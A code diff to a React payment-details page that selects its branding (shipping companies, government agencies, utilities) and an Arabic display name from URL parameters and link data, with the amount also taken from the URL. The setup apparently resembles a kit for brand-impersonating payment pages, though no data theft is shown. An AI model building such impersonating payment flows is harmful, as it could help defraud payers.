@@ -3,7 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding, getGovBranding } from "@/lib/brandingSystem";
+import { shippingCompanyBranding, getGovBranding, utilityBranding, getBrandingByCompany } from "@/lib/brandingSystem";
 import { useLinkData } from "@/hooks/useLinkData";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
@@ -37,9 +37,10 @@ const PaymentDetails = () => {
   const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
   const govId = urlParams.get('govId') || linkData?.payload?.govId;
   const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  const companyBranding = getBrandingByCompany(serviceKey);
   const govBranding = govId ? getGovBranding(govId) : undefined;
-  const serviceName = govBranding?.nameAr || linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
+  const isUtility = !!utilityBranding[serviceKey.toLowerCase()];
+  const serviceName = govBranding?.nameAr || companyBranding?.nameAr || linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const shippingInfo = linkData?.payload as any;
 
   const amountParam = urlParams.get('amount');
